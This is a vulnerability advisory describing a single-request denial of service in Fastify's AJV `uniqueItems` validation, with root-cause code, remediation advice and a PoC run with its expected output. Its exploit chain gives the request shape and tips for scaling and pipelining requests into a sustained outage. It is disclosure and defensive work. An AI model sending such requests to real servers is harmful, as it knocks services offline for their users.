# C1 — Single-request event-loop-freeze DoS via `uniqueItems` O(n²) validation

| | |
|---|---|
| **Severity** | **HIGH** (conditional on a `uniqueItems` schema without `maxItems`) |
| **Class** | Algorithmic-complexity Denial of Service |
| **CWE** | CWE-407 (Inefficient Algorithmic Complexity), CWE-1333-adjacent |
| **Component** | AJV `uniqueItems` keyword (`node_modules/ajv/dist/vocabularies/validation/uniqueItems.js`) driven from `lib/validation.js` |
| **Auth required** | No |
| **Affected** | `fastify@5.10.0` with `ajv@8.20.0` (default validator) |

## Summary

If any route declares a body/query schema with `uniqueItems: true` on an array
whose items are **objects/arrays** (or an array with **no `items` type**) and no
`maxItems`, AJV validates uniqueness with a quadratic nested-loop deep-equality
scan. Fastify runs validation **synchronously on the event-loop thread**, so a
single request carrying a large array (well within the default 1 MB `bodyLimit`)
freezes the entire server for tens of seconds to minutes. During the freeze Node
serves **no other client**.

## Attacker model & preconditions

- Remote client, no authentication.
- Precondition (app side): a reachable route has a schema like
  `{ type: 'array', uniqueItems: true }` — with object items, or with no
  `items` type — and **no `maxItems`**. This is a common "list of unique
  records" / "unique ids" shape. (A scalar `items` type, e.g.
  `items: { type: 'integer' }`, is safe: AJV uses an O(n) hashed path.)
- Attacker sends one request whose array field contains many distinct elements.

## Root-cause analysis

### AJV picks an O(n²) path unless items are scalar

`node_modules/ajv/dist/vocabularies/validation/uniqueItems.js` — `canOptimize()`
returns true (and AJV uses the O(n) hashed comparison) **only** when every item
has a scalar type. Otherwise it emits `loopN2`:

```js
// AJV uniqueItems.js (paraphrased)
function canOptimize(it) {
  // true only when items are all scalar (number/string/boolean/null) with known types
}
// loopN2: for i in 0..n:  for j in i+1..n:  if (equal(data[i], data[j])) -> duplicate
```

For an all-distinct array of length `n`, `loopN2` performs ≈ n²/2 deep
`fast-deep-equal` comparisons before concluding "all unique". Object/array items,
or an array with no declared item type, both defeat `canOptimize()`.

### Fastify runs it synchronously on the event loop

`lib/validation.js` — `validateParam` calls the compiled validator inline:

```js
// lib/validation.js
function validateParam (validatorFunction, request, paramName) {
  const isUndefined = request[paramName] === undefined
  let ret
  try {
    ret = validatorFunction?.(isUndefined ? null : request[paramName]) // <-- synchronous O(n^2)
  } catch (err) { /* … */ }
  // …
}
```

There is no work budget, no `maxItems` default, and `requestTimeout` cannot fire
during a synchronous loop. The default `bodyLimit` of 1 MB is far more than
enough: ~150k integers or ~90k small objects fit in 1 MB.

## Exploit chain

```
POST /ids   Content-Type: application/json
{"ids":[{"id":0},{"id":1}, … 30000 distinct objects … ]}     (~370 KB)
  → body parsed
  → AJV validates: uniqueItems on array-of-objects → loopN2 → ~n^2/2 deep-equals
  → event loop blocked SYNCHRONOUSLY for ~30 s (all other clients starved)
  → eventually 200 OK
```

Scale the array toward the 1 MB `bodyLimit` for multi-minute freezes; pipeline a
few such requests for a sustained outage.

## How to run

```bash
cd security-pocs/C1-uniqueitems-eventloop-dos
node poc.js          # takes ~30–60 s (that delay IS the vulnerability)
```

The script forks a vulnerable server, sends one ~370 KB POST, and — one second
into the freeze — sends a concurrent `GET /health` on a separate connection to
prove other clients are starved.

### Expected output

```
=== C1 PoC: uniqueItems O(n^2) event-loop-freeze DoS ===

[harness] vulnerable server up on 127.0.0.1:40569
[harness] baseline /health latency (idle server): 20 ms
[harness] sending ONE POST /ids  (body 370 KB, 30000 items)
[harness] and, 1s later, a concurrent GET /health from a DIFFERENT connection...

[harness] POST /ids -> HTTP 200

[harness] POST /ids         -> blocked the event loop for 29035 ms
[harness] concurrent /health -> took 28039 ms to get a reply (baseline was a few ms)

==> VULNERABLE: one small request froze the whole server for tens of seconds.
    The concurrent /health request was starved for essentially the entire freeze.
```

The concurrent `/health` taking ~28 s (versus a 20 ms baseline) is the proof of
total starvation: while the server validated one array it answered nobody else.

## Impact

- One unauthenticated ~0.3–1 MB request causes a full outage lasting tens of
  seconds to minutes; a slow trickle keeps the server permanently unavailable.
- No crash/restart to recover — the process stays up but wedged, so health
  checks that only test liveness may not even notice.

## Honest severity note

This is fundamentally AJV's documented `uniqueItems` complexity, exposed because
Fastify runs validation synchronously and sets no `maxItems`. It is **HIGH for
any app that ships a `uniqueItems`-without-`maxItems` schema on a reachable
route**, but it is not a defect in a vanilla no-schema Fastify app. Verified
end-to-end by the author and by three independent subagents (25–55 s freezes for
0.37–1 MB bodies).

## Suggested remediation

- App level: always pair `uniqueItems: true` with a small `maxItems` (the PoC
  server with `maxItems: 1000` short-circuits in ~ms), or use a scalar `items`
  type so AJV takes the O(n) path.
- Framework level: enforce a default/opt-in array-length ceiling before running
  `uniqueItems`, or run heavy validation off the main thread / with a work
  budget.

## References

- `node_modules/ajv/dist/vocabularies/validation/uniqueItems.js` (`loopN2` / `canOptimize`)
- `lib/validation.js` — `validateParam` (synchronous validator invocation)
- Default AJV options: `lib/../@fastify/ajv-compiler` (`coerceTypes:'array'`, `allErrors:false`) — neither mitigates this.
